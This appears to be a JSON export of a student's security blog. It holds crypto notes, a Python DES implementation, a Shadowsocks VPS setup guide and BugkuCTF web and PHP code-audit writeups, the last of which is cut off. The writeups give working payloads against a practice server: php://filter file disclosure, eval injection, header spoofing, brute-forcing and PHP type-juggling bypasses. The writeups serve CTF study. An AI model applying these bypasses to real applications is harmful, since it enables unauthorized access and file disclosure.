{"meta":{"title":"Gardenia's Blog","subtitle":null,"description":null,"author":"Gardenia","url":"https://gardenia30.top","root":"/"},"pages":[{"title":"My introduction","date":"2018-11-08T15:13:33.243Z","updated":"2018-11-08T15:13:33.243Z","comments":true,"path":"about/index.html","permalink":"https://gardenia30.top/about/index.html","excerpt":"","text":"中国矿业大学计算机科学与技术学院信息安全系E-mail：904367196@qq.com"}],"posts":[{"title":"RSA公钥密码算法","slug":"RSA公钥密码算法","date":"2018-12-23T05:42:29.000Z","updated":"2018-12-23T06:12:22.917Z","comments":true,"path":"2018/12/23/RSA公钥密码算法/","link":"","permalink":"https://gardenia30.top/2018/12/23/RSA公钥密码算法/","excerpt":"前言梳理一下RSA的基本思路，顺便把密码学课程设计做一下","text":"前言梳理一下RSA的基本思路，顺便把密码学课程设计做一下 正文RSA密钥生成1.先选取两个足够大的安全大素数p和q，这里的大是指长度足够长，长度至少为1024bit; 2.这时n就已经确定好了，n=p*q，φ(n)=(p-1)*(q-1); 3.随机选取一个e(1&lt;e&lt;φ(n)),e就是算法的公钥，满足gcd(e,φ(n))=1; 4.求e关于φ(n)的模逆d，d就是算法的私钥； RSA的加密过程1.将明文分组，每组对应的十进制数小于n，然后对每个明文分组进行加密； 2.","categories":[{"name":"Study","slug":"Study","permalink":"https://gardenia30.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://gardenia30.top/tags/Crypto/"}]},{"title":"DigitalOcean+PuTTY+SS如何撸梯子","slug":"DigitalOcean+PuTTY+SS如何撸梯子","date":"2018-12-22T13:34:39.000Z","updated":"2018-12-23T03:46:54.703Z","comments":true,"path":"2018/12/22/DigitalOcean+PuTTY+SS如何撸梯子/","link":"","permalink":"https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS如何撸梯子/","excerpt":"前言一直拿VPN翻墙超级卡，于是下定决心用了大半天时间撸了个梯子，感谢隔壁磊哥（巨佬）的热心帮助！","text":"前言一直拿VPN翻墙超级卡，于是下定决心用了大半天时间撸了个梯子，感谢隔壁磊哥（巨佬）的热心帮助！ 正文购买VPS早就听说有github学生包这个优惠活动，就提前申请了一波，一个edu邮箱就可以了，免费拿到digital ocean的50美元优惠兑换码，接着直接就可以创建DO的账户，从我的链接进去直接注册就可以免费赠送10刀click here，创建账户的前提就是充值5刀，折合35块吧，够我用一年了,非常划算。 总共拿到55美刀，买了个美国旧金山的服务器，5刀一个月，1TB流量，unbuntu系统，感觉还行，感觉后来速度也不错，推荐购买。 买了以后会发给你账户原始密码，直接进入Droplets页面进行设置，Launch Console进入命令行，输入原始密码进行登录，修改密码即可 下载PuTTY和隔壁小敏子（另一个巨佬）要了个PuTTY的包直接就安装好了，打开以后直接输入IP等一系列信息就可以直接登上去 PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件，可以直接连接上我的VPS，当然Xshell也是一个不错的选择。 配置VPS1.build-essential安装 linux操作系统上面开发程序，光有了gcc 是不行的它还需要一个build-essential软件包作用是提供编译程序必须软件包的列表信息，也就是说 编译程序有了这个软件包，它才知道 头文件在哪 才知道库函数在哪，还会下载依赖的软件包 最后才组成一个开发环境，当然 build-essential包 安装时 需要的依赖包 有些你用不上 1apt-get install build-essential 2.安装pip 1apt-get install python-pip 3.安装shadowsocks 1pip install shadowsocks 4.更新软件列表 1apt-get update 5.配置shadowsocks linux自带了神器vim编辑器，学习一波用法我是链接啊啊啊！ 1vi /etc/shadowsocks.json 新建ss配置文件，输入以下内容： 12345678910&#123;&quot;server&quot;:&quot;::&quot;,&quot;server_port&quot;: 选一个端口就好,&quot;local_port&quot;: 1080,&quot;timeout&quot;:300,&quot;password&quot;: &quot;yourpassword&quot;,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;:true,&quot;workers&quot;:1&#125; :wq保存退出就好，此时已经完成了对ss的配置。 6.在VPS上运行shadowsocks 输入以下命令，看见started就好 1ssserver -c /etc/shadowsocks.json -d start 7.本地接入ss 唉~移动网络真的是垃圾的一批，进github都要那么久，在github上down了一个shadowsocks.exe下来，输入刚刚配置的信息点击确定，打开启用系统代理即可 8.第八条专门用来吐槽我的今天的经历，真的是无f**k可说，经过千辛万苦连接上了ss但没想到访问不了Google，但是连我的手机热点和舍友的无线就可以，真的是……唉~算了，自己慢慢解决吧，终于查到了问题所在，我是直接插光纤上网的，而ss的启动系统代理默认的是给你打开局域网设置的代理，所以我**的忙活了那么久竟然是一个如此低端的问题，我还以为是我的ss配置错了……下面是解决办法。 安装配置SwitchyOmega这是一个Google的插件，专门用来设置代理 不多说，扔两张图： 全局代理设置： PAC模式设置： PAC设置的PAC网址就是打开局域网设置里面的脚本地址，填入以后应用，更新即可，PAC唯一的好处就是走国内的可以快一点，节省一点流量。 BBR算法提速不多说，速度还是挺慢的，需要Google发布的TCP BBR算法，给我的vps提一波速，Linux4.9的内核已经支持TCP BBR了。 1.先查看内核版本 1cat /proc/version 2.如果不够，将内核升级到4.9.10,先下载安装包； 1wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.9.10/linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb 3.安装 1dpkg -i linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb 4.查看当前有哪些内核 1dpkg -l | grep linux-image 5.删除旧的内核(我的是4.4) 1apt-get purge *4.4* 6.更新引导 1update-grub 7.重启 1reboot 8.编辑sysctl.conf文件 1vi /etc/sysctl.conf 在末尾添加如下两行后保存 12net.core.default_qdisc=fqnet.ipv4.tcp_congestion_control=bbr 9.执行如下操作 123sysctl -p #使配置生效lsmod | grep bbr 出现tcp_bbr即可，证明提速已经生效 10.刚刚已经重启了一次，所以要再次将shadowsocks在vps上跑起来 1ssserver -c /etc/shadowsocks.json -d start 后记现在我终于花了一天时间撸好了我的梯子……以后终于可以不受我大天朝网络封锁带来的影响，尽情遨游网络世界了，也希望这对以后的学习可以有所帮助。不说了，继续撸密码学了……","categories":[{"name":"VPS","slug":"VPS","permalink":"https://gardenia30.top/categories/VPS/"}],"tags":[{"name":"my vps","slug":"my-vps","permalink":"https://gardenia30.top/tags/my-vps/"}]},{"title":"密码学课程设计之DES对称加密","slug":"密码学课程设计之DES对称加密","date":"2018-12-19T00:08:56.000Z","updated":"2018-12-22T13:08:49.482Z","comments":true,"path":"2018/12/19/密码学课程设计之DES对称加密/","link":"","permalink":"https://gardenia30.top/2018/12/19/密码学课程设计之DES对称加密/","excerpt":"前言最近在进行密码学课程设计，以下仅仅为个人观点，如果大佬发现有什么错误，还请联系我进行更正。","text":"前言最近在进行密码学课程设计，以下仅仅为个人观点，如果大佬发现有什么错误，还请联系我进行更正。感觉拿python进行设计会显得比较简洁易懂，本人python比较渣渣，所以就拿出来练一练。用零零碎碎的时间写了五六天才把主干部分写完，真是菜哭我自己了。在此还需要感谢一叶飘零学长的博客，遇到困惑时果然飘零学长的博客就是最好的去处。 正文加密原理密钥生成1.输入8位字符密钥转换为64位二进制； 2.经过64位密钥经过PC-1置换为56位； 3.将56位分成两部分分别进行循环左移； 4.左移后组合，再进入PC-2置换为48位，第一轮密钥生成结束； 5.循环左移以后的两部分继续循环左移，再次进入PC-2置换，生成48位子密钥，如此进行16轮，存储16个48位的子密钥 加密处理1.输入的字符先转换为二进制，每64位为一组进行加密； 2.每一组64位的二进制先进行IP置换打乱； 3.然后将64位分成2部分，分别放入Li和Ri 4.将Ri经过F函数处理，再与Li异或，然后将值赋给R(i+1) 5.将Ri赋值给L(i+1) 6.最后一轮，直接将Ri赋给R(i+1),再将Ri经过F函数处理，再与Li异或，然后将值赋给L(i+1) 7.将L和R合并后经过逆IP盒，得到密文C F函数1.先将输入的32位Ri进行扩展置换E，转换为48位 2.再与生成的子密钥进行异或 3.将异或后的值经过S盒压缩为32位 4.再进行P置换打乱顺序 加密详细过程各个置换dict123456789101112131415dic_IP=[58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7]dic_key1=[57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]dic_key2=[14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]dic_e=[32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1]dic_s=[[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]dic_p=[16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25]dic_n=[1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]dic_IP2=[40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25] 初始IP置换将初始明文字符转换为64位二进制，并进行第一次IP置换。 需要注意的就是在python中用format函数非常方便，没有bin函数开头的0b,在这里需要将转换的二进制字符补足8位（在左边补0即可） 123456789def init_p(p): s1=\"\" res=\"\" for i in range(8): b='&#123;:08b&#125;'.format(ord(p[i])) s1+=b for i in range(64): res+=s1[dic_IP[i]-1] return res 字符串的循环左移生成16个子密钥时需要循环左移函数，使用到的就是py的切片，先需要对密钥56位分为两部分，分别28位，然后这两部分分别循环左移 1234def zuoyi(n,ki): temp=ki[n:len(ki)] temp=temp+ki[0:n] return temp 密钥初始编排-PC1需要对输入的8个字符进行二进制转换并补足64位，然后将这64位字符进行PC-1置换，从64位置换为56位 123456789def init_pc_1(k): k1=\"\" k2=\"\" for i in range(8): b='&#123;:08b&#125;'.format(ord(k[i])) k1+=b for i in range(56): k2+=k1[dic_key1[i]-1] return k2 密钥二次编排-PC2将每次循环左移的密钥组合后进行PC-2置换，由56位转换为48位，并存储 12345def init_pc_2(k): res=\"\" for i in range(48): res+=k[dic_key2[i]-1] #将56位转换为48位 return res 按位异或两个相同长度的字符进行按位异或 123456789def xor(r_e,ki): res=\"\" for i in range(len(r_e)): xor_res=int(r_e[i],10)^int(ki[i],10) if xor_res==1: res+=\"1\" else: res+=\"0\" return res E盒扩展将转换为二进制的64位明文分成两部分，Li和Ri，需要将Ri从32位二进制置换为48位，需要经过E盒扩展 12345def box_e(r): temp_r=\"\" for i in range(48): temp_r+=(r[dic_e[i]-1]) #将32位扩展为48位 return temp_r S盒处理这里有8个S盒，从E盒出来的48位数据分为8组，每组6位，分别进入8个S盒，上面将这8个S盒分别装入列表，并将这8个列表装入一个大列表，类似于C++里的二维数组。 将6位中的首位和末位组合并转换为10进制，为行 将6位中剩下的4位组合转换为10进制，为列 查找到对应行列的S盒中的值，将其转换为二进制字符并存储在res中 1234567891011def box_s(r): j=0 res=\"\" for i in range(0,len(r),6): #步长为6 begins=r[i:i+6] hang=int(begins[0]+begins[5],2) lie=int(begins[1:5],2) num='&#123;:04b&#125;'.format(dic_s[j][16*hang+lie]) #将s盒中对应数字转为二进制字符串并补满4位 res+=num j=j+1 return res P盒置换12345def box_p(r): res=\"\" for i in range(32): res+=r[dic_p[i]-1] return res 生成16个子密钥64位密钥先经过pc1置换为56位，分成两部分，分别循环左移，组合后进行二次密钥编排，将产生的16个子密钥按序存储在keylist中 12345678910def key_list(key): temp_1=init_pc_1(key) k_l=temp_1[0:28] k_r=temp_1[28:56] for i in range(16): k_l=zuoyi(dic_n[i],k_l) #前28位左移n k_r=zuoyi(dic_n[i],k_r) #后28位左移n key_yiwei=k_l+k_r key_res=init_pc_2(key_yiwei) keylist.append(key_res) F函数先E盒置换，再与子密钥异或，再S盒处理，最后进行P盒处理 123456def fun_F(str1,key): res_e=box_e(str1) res_xor=xor(res_e,key) res_s=box_s(res_xor) res_p=box_p(res_s) return res_p IP逆置换12345def IP_NI(c): res=\"\" for i in range(64): res+=c[dic_IP2[i]-1] return res 加密一组8个字符的加密 123456789101112131415def DES_encode_one_group(p,k): p_bin=init_p(p) #str 64 p_left=p_bin[0:32] #str 32 left p_right=p_bin[32:] #str 32 right key_list(k) #生成16个子密钥 for i in range(15): #16轮迭代 p_temp=p_right #暂存 fin_r=fun_F(p_right,keylist[i]) #Ri经过F函数 p_right=xor(fin_r,p_left) #Ri p_left=p_temp #Li final_right=p_right final_left=xor(fun_F(p_right,keylist[15]),p_left) fin=final_left+final_right fin=IP_NI(fin) return fin 加密全部8个字符一组进行分组，每组分别进行加密 1234567def DES_encode(p,k): res=&quot;&quot; i=0 while p[i:i+8]!=&quot;&quot;: res+=DES_encode_one_group(p[i:i+8],key) i=i+8 return res 解密一组一组64位二进制进行解密 123456789101112131415161718192021def DES_decode_one_group(c): cipher=\"\" #key_list(k) for i in range(64): cipher+=c[dic_IP[i]-1] #c经过IP1置换放入cipher cipher_left=cipher[0:32] cipher_right=cipher[32:] i=15 while i&gt;0: cipher_temp=cipher_right cipher_right=xor(fun_F(cipher_right,keylist[i]),cipher_left) cipher_left=cipher_temp i=i-1 fin_right=cipher_right fin_left=xor(fun_F(cipher_right,keylist[0]),cipher_left) final=fin_left+fin_right final=IP_NI(final) ming=\"\" for x in range(0,64,8): ming+=chr(int(final[x:x+8],2)) return ming 解密全部每组64位二进制，分组解密 1234567def DES_decode(c): i=0 res=\"\" while c[i:i+64]!=\"\": res+=DES_decode_one_group(c[i:i+64]) i=i+64 return res","categories":[{"name":"Study","slug":"Study","permalink":"https://gardenia30.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://gardenia30.top/tags/Crypto/"}]},{"title":"BugkuCTF Web Writeup","slug":"BugkuCTF-Web-Writeup","date":"2018-12-01T06:16:14.000Z","updated":"2018-12-22T11:26:28.696Z","comments":true,"path":"2018/12/01/BugkuCTF-Web-Writeup/","link":"","permalink":"https://gardenia30.top/2018/12/01/BugkuCTF-Web-Writeup/","excerpt":"前言菜狗就要多刷题…","text":"前言菜狗就要多刷题… 正文web2flag在源码的注释里 计算器改一下text文本框的最大输入位数&gt;1即可 web基础$_GETGET方式传参即可 web基础$_POSTpost方式传参即可 矛盾1234567$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; 这题要求传参num不能是数字，而且num=1，一开始没有什么思路，认为是弱类型的绕过，传了true进去，发现无效，问了一下度娘，发现在数字后面加上%00截断，is_numeric()函数就不能识别为数字了…payload:1123.206.87.240:8002/get/index1.php?num=1%00 web3这题疯狂弹出对话框，阻止以后查看源码，果然全是alert弹窗，在最下面的注释里发现了一大串编码，不太认识：问了一下度娘，发现是unicode，直接在线解码即可 域名解析进入windows/system32/drivers/etc/hosts中添加123.206.87.240 flag.baidu.com，然后直接访问域名即可 你必须让他停下这题如何让他停下?直接bp抓包拦截，然后一次一次执行，go了几次发现flag 本地包含123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; REQUEST默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。这题的最终目的就是要看到flag.php里的内容，eval是执行$a里的内容，所以直接file(‘flag.php’)就可以payload:1http://123.206.87.240:8003/?hello=file(%27flag.php%27) 变量1这题花了点时间研究了一下1234567891011121314flag In the variable !&lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; 理解1：preg_match()是正则表达式的匹配，/^表示开始，$/表示结束，结束字符 \\w包含[a-z,A-Z,,0-9]中的字符，+代表可以有一个或多个;理解2：$$args表示的是以$args为变量名的变量;理解3：$GLOBALS[]包含正在执行脚本所有超级全局变量的引用内容;开头就提示flag在变量里，所以只要看看变量里都放了些什么就可以了，args=GLOABLS就可以将$$args解析成$GLOBALS,var_dump打印变量的相关信息这样就可以显示出所有变量的内容payload:1http://123.206.87.240:8004/index1.php?args=GLOBALS Web5提示是jspfuck，查看源代码，复制下来放到google控制台跑一下发现了ctf{whatfk}，提交提示离答案非常接近，要求是CTF头，所以全部大写提交，成功… 头等舱打开发现什么都没有…查看源代码也没有什么东西，F12查看一波也没有什么发现，无奈之下用bp截取之后运行…以为有点难，没想到是水题… 网站被黑嗯，挺漂亮的网页，查看半天也没发现什么奇怪的东西，就扫一波后台目录发现了index.php和shell.php，打开shell.php如图：发现需要输入密码，bp抓一波，然后选择passwords字典暴力破解降序排列一波发现1110匹配项 管理员系统这题不太会，找到源码中的base64编码解码以后是test123，输入admin为用户名，test123为密码，发现不能访问，IP禁止访问，请联系本地管理员登录，也就是说需要本地登录才可以进去，所以就尝试着bp抓一波包，从大佬的wp中了解到这题需要伪装成本地访问才可以通过，伪装本地访问的方法就是在headers里面添加如下http头：1X-Forwarded-For:127.0.0.1 弹出flag： web4提示查看源码就查看一波源码，发现一大串url编码：解码后：12345678910111213function checkSubmit()&#123; var a=document.getElementById(\"password\"); if(\"undefined\"!=typeof a) &#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value) return!0; alert(\"Error\"); a.focus(); return!1 &#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit; 将67d709b2b54aa2aa648cf6e87a7114f1这一串数字提交到表单里直接出flag…(什么鬼玩意儿) flag在index里文件包含题，和nctf的文件包含如出一辙；payload:1http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 解析为base64编码，解码后发现flag 输入密码查看flag进去发现需要输入5位密码,就直接用burp爆破一下，先设置五位数字爆破等一下发现出现length不一样的项目，直接找到了flag 点击一百万次这题你点一下鼠标数值就会加一，123456789101112131415161718192021&lt;script&gt; var clicks=0 $(function() &#123; $(\"#cookie\") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $(\"#clickcount\").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action=\"\" method=\"post\"&gt;' + '&lt;input type=\"text\" name=\"clicks\" value=\"' + clicks + '\" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;); &#125;); &lt;/script&gt; 查看源代码发现只要点击鼠标就会clicks++，method是POST，所以可以直接post一个clicks=1000000过去就可以了得到flag 备份是个好习惯提示备份直接进入index.php.bak,发现如下,是一个弱类型的MD5绕过，构造MD5值为0e开头的值就可以了123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);//返回从1到后面的字符$str = str_replace('key','',$str);//key替换为''parse_str($str);//字符串解析到变量echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.\"取得flag\";&#125;?&gt; 去掉第一个字符后，用’’替换key，也就是直接去掉key，然后字符串解析到变量，构造payload:1http://123.206.87.240:8002/web16/?kekeyy1=s878926199a&amp;kekeyy2=QNKCDZO 持续更新…","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://gardenia30.top/categories/Writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://gardenia30.top/tags/CTF/"},{"name":"Writeup","slug":"Writeup","permalink":"https://gardenia30.top/tags/Writeup/"}]},{"title":"BugkuCTF代码审计Writeup","slug":"BugkuCTF代码审计writeup","date":"2018-11-30T11:55:02.000Z","updated":"2018-12-22T11:33:16.376Z","comments":true,"path":"2018/11/30/BugkuCTF代码审计writeup/","link":"","permalink":"https://gardenia30.top/2018/11/30/BugkuCTF代码审计writeup/","excerpt":"前言最近在读吴翰清先生的《白帽子讲Web安全》","text":"前言最近在读吴翰清先生的《白帽子讲Web安全》，可以说是菜狗打开了自己新世界的大门，像是那种在乡下待了几十年的无知少年突然到了一个大城市的那种感觉，虽然有些东西现在还是不能完全参悟，但是感觉自己正在慢慢了解了这个领域而且兴趣比以前多了许多，有了一种想学下去的欲望，自己在大一大二并没有找对自己的定位，浑浑噩噩不知道干了些什么，代码能力很弱，导致现在代码审计类题目菜的一批，所以还是要脚踏实地，从最基础的地方开始学习，心无旁骛忘记烦恼，既然找到了想学习的东西，就认真下去吧，fight！看了白帽子的PHP安全这一块内容，决定上手一些题目练一练基础，下面放上一些晚上练习的Bugku的代码审计题目(嗓子疼的感觉真tm是这辈子最难受的了) 正文extract变量覆盖12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 和南邮的变量覆盖没什么区别，shiyan和flag作为键名传值；payload:1http://123.206.87.240:9009/1.php?shiyan=&amp;flag= strcmp比较字符串12345678910&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 看见==大概率就是弱类型绕过了，strcmp函数是不能处理数组的，直接构造一个数组就可以返回null==0payload:1http://123.206.87.240:9009/6.php?a[]=1 urldecode二次编码绕过12345678910111213&lt;?php if(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\"not allowed!\"); exit(); &#125; $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") &#123; echo \"Access granted!\"; echo \"flag\"; &#125;?&gt; eregi()函数规定id中不能包含hackerDJ，直接将hackerDJ用url编码：1%68%61%63%6B%65%72%44%4A 放进去还是一样，问了一下度娘发现url在$get 进行传参的时候一般都进行了一次解码，所以上面的url编码实际上已经被解码了，直接就弹出了“not allowed!”于是将得到的url编码进行二次编码即可:1%2568%2561%2563%256B%2565%2572%2544%254A payload:1http://123.206.87.240:9009/10.php?id=%2568%2561%2563%256B%2565%2572%2544%254A md5()函数123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 同样md5函数也是不可以处理数组的，而且username!=password，===是强类型，需要完全一样，类型也必须一样，所以两个null===null，完美….payload:1http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 md5加密相等绕过123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo \"flag&#123;*&#125;\";&#125; else &#123;echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; 老题，==弱类型绕过，QNKCDZO的MD5值是0e开头解析为0，所以直接找一个a让他的MD5值也为0e开头就好payload:1http://123.206.87.240:9009/13.php?a=s878926199a 数组返回NULL绕过123456789101112&lt;?php$flag = \"flag\";if (isset ($_GET['password'])) &#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 题目要求password中只能出现大小写字母和数字，还必须要出现*–*而且还不是弱类型!==方法1：strop函数同样也是不能处理数组的直接构造一个数组返回null!==FALSE即可payload:1http://123.206.87.240:9009/19.php?password[]=1 方法2：构造%00截断，ereg函数只能处理到00之前的字符payload:1http://123.206.87.240:9009/19.php?password=1%00*--* 弱类型整数大小比较绕过1234$temp = $_GET['password'];is_numeric($temp)?die(\"no numeric\"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric要求不能是数字，而且要大于1336，用%00跟在数字后会判断为非数字payload:1http://123.206.87.240:9009/22.php?password=1337%00 这题很奇怪，我用数组试了一下，也是可以的，搞不懂… sha()函数比较绕过1234567891011121314151617181920212223242526272829&lt;?php$flag = \"flag\";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo \"\";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'Invalid password.';&#125;elseecho 'Login first!';?&gt; sha1函数同样不能处理数组，直接构造两个不相等的数组传进去即可构造null===nullpayload:1http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2 十六进制与数字比较12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return \"flase\";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 要求传一个password值进去，password不能是1-9的数字，而且要和3735929054相等，转化为十六进制数:deadc0depayload:1http://123.206.87.240:9009/20.php?password=0xdeadc0de ereg正则%00截断12345678910111213141516171819202122232425262728293031323334&lt;?php$flag = \"xxx\";if (isset ($_GET['password']))&#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeric';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo 'Invalid password';&#125;&#125;?&gt; 还是ereg()的%00截断，而且输入的值小于8位，大于9999999，使用科学计数法，输入1e8,00截断*-*即可payload:1http://123.206.87.240:9009/5.php?password=1e8%00*-* strpos数组绕过1234567891011&lt;?php$flag = \"flag\";if (isset ($_GET['ctf'])) &#123;if (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; nctf差不多的题目，必须是1-9的数字，而且要包含#biubiubiu坑点:#需要用url编码payload:1http://123.206.87.240:9009/15.php?ctf=1%00%23biubiubiu 数字验证正则绕过12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (\"POST\" == $_SERVER['REQUEST_METHOD'])&#123;$password = $_POST['password'];if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //preg_match — 执行一个正则表达式匹配&#123;echo 'flag';exit;&#125;while (TRUE)&#123;$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';if (6 &gt; preg_match_all($reg, $password, $arr))break;$c = 0;$ps = array('punct', 'digit', 'upper', 